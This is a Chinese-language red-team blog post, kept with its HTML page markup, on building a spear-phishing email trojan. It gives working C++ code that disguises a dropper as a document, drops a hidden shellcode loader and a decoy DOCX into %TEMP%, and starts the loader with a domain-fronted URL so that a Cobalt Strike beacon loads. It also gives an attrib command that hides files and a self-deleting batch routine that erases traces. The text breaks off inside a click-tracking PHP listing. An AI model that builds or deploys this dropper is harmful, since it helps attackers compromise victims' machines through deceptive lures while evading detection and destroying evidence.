<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="极客兔兔的小站，致力于分享一些技术教程和有趣的技术实践。">
<meta property="og:type" content="article">
<meta property="og:title" content="钓鱼攻击-邮件马的制作">
<meta property="og:url" content="https://c1y2m3.github.io/2020/07/09/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB-%E9%82%AE%E4%BB%B6%E9%A9%AC%E7%9A%84%E5%88%B6%E4%BD%9C/index.html">
<meta property="og:site_name" content="c1y2m3&#39;s blog">
<meta property="og:description" content="极客兔兔的小站，致力于分享一些技术教程和有趣的技术实践。">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://c1y2m3.oss-cn-beijing.aliyuncs.com/1597654172885-24c121e3-6b51-4a81-8d56-7f61be780005.png">
<meta property="og:image" content="https://c1y2m3.oss-cn-beijing.aliyuncs.com/1597654172893-7f1eab69-4311-48b5-a782-59718102470f.png">
<meta property="og:image" content="https://c1y2m3.oss-cn-beijing.aliyuncs.com/1597654172839-b244f42d-8d9f-45d6-94ee-cbcadcff132e.png">
<meta property="og:image" content="https://c1y2m3.oss-cn-beijing.aliyuncs.com/1597654172915-9f25bdac-0244-45c3-8cd7-bb3f48d336cd.png">
<meta property="og:image" content="https://c1y2m3.oss-cn-beijing.aliyuncs.com/1597654172793-75b0d0f2-aa25-432f-a8b3-c45c9fa64790.png">
<meta property="og:image" content="https://c1y2m3.oss-cn-beijing.aliyuncs.com/1597654173091-355d87a1-8b0b-44b4-9677-1d054c4999cc.gif">
<meta property="og:image" content="https://c1y2m3.oss-cn-beijing.aliyuncs.com/1597654172917-fac98e69-78da-4bcf-8d6c-4043921f4dc8.png">
<meta property="og:image" content="https://c1y2m3.oss-cn-beijing.aliyuncs.com/1597654172921-6e5f6b3c-2a44-41c8-b154-0c7ff838f1e8.png">
<meta property="article:published_time" content="2020-07-09T03:51:24.000Z">
<meta property="article:modified_time" content="2023-02-01T11:47:30.000Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://c1y2m3.oss-cn-beijing.aliyuncs.com/1597654172885-24c121e3-6b51-4a81-8d56-7f61be780005.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>钓鱼攻击-邮件马的制作</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     --><!--
       --><li><a href="/life/">漂泊</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/c1y2m3">github</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2020/08/01/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB-%E5%B8%B8%E8%A7%84%E9%82%AE%E7%AE%B1%E9%AA%8C%E8%AF%81%E5%AD%98%E6%B4%BB/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2020/06/15/%E5%9F%BA%E4%BA%8ESSP%E6%AD%A6%E5%99%A8%E5%8C%96%E7%9A%84%E5%A5%87%E6%80%9D%E5%BC%82%E6%83%B3/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://c1y2m3.github.io/2020/07/09/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB-%E9%82%AE%E4%BB%B6%E9%A9%AC%E7%9A%84%E5%88%B6%E4%BD%9C/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://c1y2m3.github.io/2020/07/09/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB-%E9%82%AE%E4%BB%B6%E9%A9%AC%E7%9A%84%E5%88%B6%E4%BD%9C/&text=钓鱼攻击-邮件马的制作"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://c1y2m3.github.io/2020/07/09/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB-%E9%82%AE%E4%BB%B6%E9%A9%AC%E7%9A%84%E5%88%B6%E4%BD%9C/&title=钓鱼攻击-邮件马的制作"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://c1y2m3.github.io/2020/07/09/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB-%E9%82%AE%E4%BB%B6%E9%A9%AC%E7%9A%84%E5%88%B6%E4%BD%9C/&is_video=false&description=钓鱼攻击-邮件马的制作"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=钓鱼攻击-邮件马的制作&body=Check out this article: https://c1y2m3.github.io/2020/07/09/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB-%E9%82%AE%E4%BB%B6%E9%A9%AC%E7%9A%84%E5%88%B6%E4%BD%9C/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://c1y2m3.github.io/2020/07/09/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB-%E9%82%AE%E4%BB%B6%E9%A9%AC%E7%9A%84%E5%88%B6%E4%BD%9C/&title=钓鱼攻击-邮件马的制作"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://c1y2m3.github.io/2020/07/09/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB-%E9%82%AE%E4%BB%B6%E9%A9%AC%E7%9A%84%E5%88%B6%E4%BD%9C/&title=钓鱼攻击-邮件马的制作"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://c1y2m3.github.io/2020/07/09/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB-%E9%82%AE%E4%BB%B6%E9%A9%AC%E7%9A%84%E5%88%B6%E4%BD%9C/&title=钓鱼攻击-邮件马的制作"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://c1y2m3.github.io/2020/07/09/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB-%E9%82%AE%E4%BB%B6%E9%A9%AC%E7%9A%84%E5%88%B6%E4%BD%9C/&title=钓鱼攻击-邮件马的制作"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://c1y2m3.github.io/2020/07/09/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB-%E9%82%AE%E4%BB%B6%E9%A9%AC%E7%9A%84%E5%88%B6%E4%BD%9C/&name=钓鱼攻击-邮件马的制作&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://c1y2m3.github.io/2020/07/09/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB-%E9%82%AE%E4%BB%B6%E9%A9%AC%E7%9A%84%E5%88%B6%E4%BD%9C/&t=钓鱼攻击-邮件马的制作"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E6%9C%A8%E9%A9%AC%E6%80%9D%E8%B7%AF"><span class="toc-number">1.</span> <span class="toc-text">0x01 木马思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%B5%81%E7%A8%8B"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">实现流程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE"><span class="toc-number">1.0.0.1.1.</span> <span class="toc-text">一、资源释放</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%96%87%E4%BB%B6%E9%9A%90%E8%94%BD"><span class="toc-number">1.0.0.1.2.</span> <span class="toc-text">二、文件隐蔽</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8B"><span class="toc-number">1.0.0.1.3.</span> <span class="toc-text">三、创建进程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E7%97%95%E8%BF%B9%E6%B8%85%E9%99%A4"><span class="toc-number">1.0.0.1.4.</span> <span class="toc-text">四、痕迹清除</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%88%E6%9E%9C%E6%BC%94%E7%A4%BA"><span class="toc-number">1.0.0.2.</span> <span class="toc-text">效果演示</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%B1%BC%E7%AB%BF%E6%84%9F%E7%9F%A5"><span class="toc-number">1.0.0.3.</span> <span class="toc-text">鱼竿感知</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-number">2.</span> <span class="toc-text">结语</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        钓鱼攻击-邮件马的制作
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">John Doe</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2020-07-09T03:51:24.000Z" itemprop="datePublished">2020-07-09</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>本文主要分享钓鱼马的制作思路，也都是尝试，经验不够丰富 。关于邮件投递的问题，后续我们展开来讲。</p>
<p>在红队工作中，往往长时间无法打到一个据点，鱼叉攻击会是最常见的攻击快速的手段，根据场景制定不同的邮件样本会得到意想不到的效果。</p>
<h1 id="0x01-木马思路"><a href="#0x01-木马思路" class="headerlink" title="0x01 木马思路"></a>0x01 木马思路</h1><p>将样本自身图标伪装成图片或文档，运行样本之后释放资源中的相应的DOC文档以及加载器并设置隐藏文件属性，然后创建进程远程请求域前置服务端解密shellcode并加载到内存中运行，依次打开用于社工掩护的word文档迷惑目标，程序判断运行完毕并删除自身。</p>
<h4 id="实现流程"><a href="#实现流程" class="headerlink" title="实现流程"></a>实现流程</h4><p><strong>开发工具：Visual Studio 2017</strong></p>
<h5 id="一、资源释放"><a href="#一、资源释放" class="headerlink" title="一、资源释放"></a>一、资源释放</h5><p>思路：①加载文件到工程中，②使用函数查找资源，③创建文件，④写入资源。</p>
<p>1.在项目工程上点击右键，选择“添加资源”；</p>
<p><img src="https://c1y2m3.oss-cn-beijing.aliyuncs.com/1597654172885-24c121e3-6b51-4a81-8d56-7f61be780005.png" alt="img"></p>
<p>2.选择”导入”项，选择“所有文件”，选择要导入的文件</p>
<p><img src="https://c1y2m3.oss-cn-beijing.aliyuncs.com/1597654172893-7f1eab69-4311-48b5-a782-59718102470f.png" alt="img"></p>
<p>3.会弹出命名自定义资源类型的对话框，自定义我们的资源类型；</p>
<p><img src="https://c1y2m3.oss-cn-beijing.aliyuncs.com/1597654172839-b244f42d-8d9f-45d6-94ee-cbcadcff132e.png" alt="img"></p>
<p>4.点击确定后，完成导入，”Ctrl+S”保存二进制资源文件；</p>
<p><img src="https://c1y2m3.oss-cn-beijing.aliyuncs.com/1597654172915-9f25bdac-0244-45c3-8cd7-bb3f48d336cd.png" alt="img"></p>
<p>5.可以在自动添加的“resource.h”头文件中看到资源ID宏；</p>
<p><img src="https://c1y2m3.oss-cn-beijing.aliyuncs.com/1597654172793-75b0d0f2-aa25-432f-a8b3-c45c9fa64790.png" alt="img"></p>
<p>6.编程实现载入资源。</p>
<ul>
<li>EXE资源载入文件代码：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;cstdio&gt;</span><br><span class="line">#include &lt;cstdlib&gt;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &quot;resource.h&quot;</span><br><span class="line"> </span><br><span class="line">using namespace std;</span><br><span class="line"> </span><br><span class="line">typedef VOID(*Func)(VOID);</span><br><span class="line"> </span><br><span class="line">char *randstr(char *str, const int len)</span><br><span class="line">&#123;</span><br><span class="line">	srand(time(NULL));</span><br><span class="line">	int i;</span><br><span class="line">	for (i = 0; i &lt; len; ++i)</span><br><span class="line">	&#123;</span><br><span class="line">		switch ((rand() % 3))</span><br><span class="line">		&#123;</span><br><span class="line">		case 1:</span><br><span class="line">			str[i] = &#x27;A&#x27; + rand() % 26;</span><br><span class="line">			break;</span><br><span class="line">		case 2:</span><br><span class="line">			str[i] = &#x27;a&#x27; + rand() % 26;</span><br><span class="line">			break;</span><br><span class="line">		default:</span><br><span class="line">			str[i] = &#x27;0&#x27; + rand() % 10;</span><br><span class="line">			break;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	str[i] = &#x27;\0&#x27;;</span><br><span class="line">	return str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL ReleaseLibrary(UINT uResourceId, CHAR* szResourceType, CHAR* szFileName)</span><br><span class="line">&#123;</span><br><span class="line">	// 找到资源</span><br><span class="line">	HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(uResourceId), szResourceType);</span><br><span class="line">	// 获取资源大小</span><br><span class="line">	DWORD dwSize = SizeofResource(NULL, hRsrc);</span><br><span class="line"></span><br><span class="line">	// 载入资源</span><br><span class="line">	HGLOBAL hGlobal = LoadResource(NULL, hRsrc);</span><br><span class="line"></span><br><span class="line">	// 锁定资源，并返回指向资源第一字节的指针</span><br><span class="line">	LPVOID lpRes = LockResource(hGlobal);</span><br><span class="line">	HANDLE hFile = CreateFile(szFileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);</span><br><span class="line">	DWORD dwWriten = 0;</span><br><span class="line">	BOOL bRes = WriteFile(hFile, lpRes, dwSize, &amp;dwWriten, NULL);</span><br><span class="line">	CloseHandle(hFile);</span><br><span class="line">	CloseHandle(hGlobal);</span><br><span class="line">	CloseHandle(hRsrc);</span><br><span class="line">	return TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int APIENTRY WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd)</span><br><span class="line">&#123;</span><br><span class="line">	char name[20];</span><br><span class="line">	char *exe = randstr(name, 8);</span><br><span class="line">	ZeroMemory(SaveFile, MAX_PATH);</span><br><span class="line">	GetEnvironmentVariable(TEXT(&quot;TMP&quot;), SaveFile, MAX_PATH);</span><br><span class="line">	const char * FileName = &quot;\\&quot;;</span><br><span class="line">	strcat_s(SaveFile, FileName);</span><br><span class="line">	strcat_s(SaveFile, exe);</span><br><span class="line">	strcat_s(SaveFile, TEXT(&quot;.exe&quot;));</span><br><span class="line">	BOOL wRes = ReleaseLibrary(IDR_KKKPPC1, (CHAR*)&quot;KKKPPC&quot;, (CHAR*)SaveFile);</span><br><span class="line">			BOOL bRes = ReleaseLibrary(IDR_LGASD1, (CHAR*)&quot;LGASD&quot;, (CHAR*)&quot;关于XXXXX.docx&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行样本之后，在%TEMP%目录下释放shellcode加载器以及相应内容的DOC文档，</p>
<h5 id="二、文件隐蔽"><a href="#二、文件隐蔽" class="headerlink" title="二、文件隐蔽"></a>二、文件隐蔽</h5><p>使用Attrib +s +h命令把原本的文件增加了系统文件属性、隐藏文件属性。</p>
<p>这样该文件就不能在目录中被发现，但是仍然存在可以访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attrib C:\Users\ThinkPad\AppData\Local\Temp\jqR78D62.exe  +s +h</span><br></pre></td></tr></table></figure>

<h5 id="三、创建进程"><a href="#三、创建进程" class="headerlink" title="三、创建进程"></a>三、创建进程</h5><p>使用CreateProcess()创建进程，这里配合的是unkonw师傅的[shellcode远程加载器改造计划]，去配合DoaminFronting 远程动态AES加密加载shellcode。</p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Zs_fCqZfzdzHTwVPvshFyQ">https://mp.weixin.qq.com/s/Zs_fCqZfzdzHTwVPvshFyQ</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PROCESS_INFORMATION pi;</span><br><span class="line">STARTUPINFO si = &#123; sizeof(si) &#125;;</span><br><span class="line">si.cb = sizeof(si);</span><br><span class="line">si.wShowWindow = TRUE;</span><br><span class="line">strcat_s(SaveFile, TEXT(&quot; http://qq.com/api DomainFronting&quot;));</span><br><span class="line">BOOL bRet = CreateProcess(</span><br><span class="line">	NULL,//不在此指定可执行文件的文件名</span><br><span class="line">	SaveFile,//命令行参数</span><br><span class="line">	NULL,//默认进程安全性</span><br><span class="line">	NULL,//默认进程安全性</span><br><span class="line">	FALSE,//指定当前进程内句柄不可以被子进程继承</span><br><span class="line">	CREATE_NEW_CONSOLE,//为新进程创建一个新的控制台窗口</span><br><span class="line">	NULL,//使用本进程的环境变量</span><br><span class="line">	NULL,//使用本进程的驱动器和目录</span><br><span class="line">	&amp;si,</span><br><span class="line">	&amp;pi);</span><br></pre></td></tr></table></figure>

<p>最后打开诱饵文件，此时cobalt strike已经成功上线。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ShellExecute(NULL, &quot;open&quot;, &quot;关于XXXXX.docx&quot;, NULL, NULL, SW_SHOW);</span><br></pre></td></tr></table></figure>

<h5 id="四、痕迹清除"><a href="#四、痕迹清除" class="headerlink" title="四、痕迹清除"></a>四、痕迹清除</h5><p>删除自身程序代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">// this is the name of the temporary .bat file</span><br><span class="line">static const char tempbatname[] = &quot;_uninsep.bat&quot; ;</span><br><span class="line"></span><br><span class="line">void Selfdestruct() </span><br><span class="line">&#123;</span><br><span class="line">  // temporary .bat file</span><br><span class="line">  static char templ[] = </span><br><span class="line">    &quot;:Repeat\r\n&quot;</span><br><span class="line">    &quot;del \&quot;%s\&quot;\r\n&quot;</span><br><span class="line">    &quot;if exist \&quot;%s\&quot; goto Repeat\r\n&quot;</span><br><span class="line">    &quot;rmdir \&quot;%s\&quot;\r\n&quot;</span><br><span class="line">    &quot;del \&quot;%s\&quot;&quot; ;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  char modulename[_MAX_PATH] ;    // absolute path of calling .exe file</span><br><span class="line">  char temppath[_MAX_PATH] ;      // absolute path of temporary .bat file</span><br><span class="line">  char folder[_MAX_PATH] ;</span><br><span class="line"></span><br><span class="line">  GetTempPath(_MAX_PATH, temppath) ;</span><br><span class="line">  strcat(temppath, tempbatname) ;</span><br><span class="line"></span><br><span class="line">  GetModuleFileName(NULL, modulename, MAX_PATH) ;</span><br><span class="line">  strcpy (folder, modulename) ;</span><br><span class="line">  char *pb = strrchr(folder, &#x27;\\&#x27;);</span><br><span class="line">  if (pb != NULL)</span><br><span class="line">    *pb = 0 ;</span><br><span class="line"></span><br><span class="line">  HANDLE hf ;</span><br><span class="line">  </span><br><span class="line">  hf = CreateFile(temppath, GENERIC_WRITE, 0, NULL, </span><br><span class="line">              CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL) ;</span><br><span class="line">  </span><br><span class="line">  if (hf != INVALID_HANDLE_VALUE)</span><br><span class="line">  &#123;</span><br><span class="line">    DWORD len ;</span><br><span class="line">    char *bat ;</span><br><span class="line"></span><br><span class="line">    bat = (char*)alloca(strlen(templ) + </span><br><span class="line">               strlen(modulename) * 2 + strlen(temppath) + 20) ;</span><br><span class="line"></span><br><span class="line">    wsprintf(bat, templ, modulename, modulename, folder, temppath) ;</span><br><span class="line"></span><br><span class="line">    WriteFile(hf, bat, strlen(bat), &amp;len, NULL) ;</span><br><span class="line">    CloseHandle(hf) ;</span><br><span class="line"></span><br><span class="line">    ShellExecute(NULL, &quot;open&quot;, temppath, NULL, NULL, SW_HIDE);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>假设要销毁自身的可执行文件位于<em>c：\ myfolder \ selfdestruct.exe中</em>。该<code>Selfdestruct()</code>函数将在计算机的temp文件夹中创建以下.bat文件，然后启动它：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">:Repeat</span><br><span class="line">del &quot;c:\myfolder\selfdestruct.exe&quot;</span><br><span class="line">if exist &quot;c:\myfolder\selfdestruct.exe&quot; goto Repeat</span><br><span class="line">rmdir &quot;c:\myfolder&quot;</span><br><span class="line">del &quot;c:\temp\_uninsep.bat&quot; ;</span><br></pre></td></tr></table></figure>

<p>.bat文件将循环删除<em>c：\ myfolder \ selfdestruct.exe</em>，直到最终成功（即<em>selfdestruct.exe</em>完成执行后。）然后尝试删除包含的文件夹（此处为<em>c：\ myfolder</em>），只有当它为空时才起作用，最后将其自身删除。</p>
<h4 id="效果演示"><a href="#效果演示" class="headerlink" title="效果演示"></a>效果演示</h4><p><img src="https://c1y2m3.oss-cn-beijing.aliyuncs.com/1597654173091-355d87a1-8b0b-44b4-9677-1d054c4999cc.gif" alt="img"></p>
<h4 id="鱼竿感知"><a href="#鱼竿感知" class="headerlink" title="鱼竿感知"></a>鱼竿感知</h4><p>如果平常去河边钓鱼，要使用浮漂才会知道这条河是否有鱼吃饵料，同理当邮件投递出去后，判断目标是否点击了邮件，不至于那么的苦等，这里我丢一个简单的demo,实际上它是可以写成一个框架的。</p>
<p>stat.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span 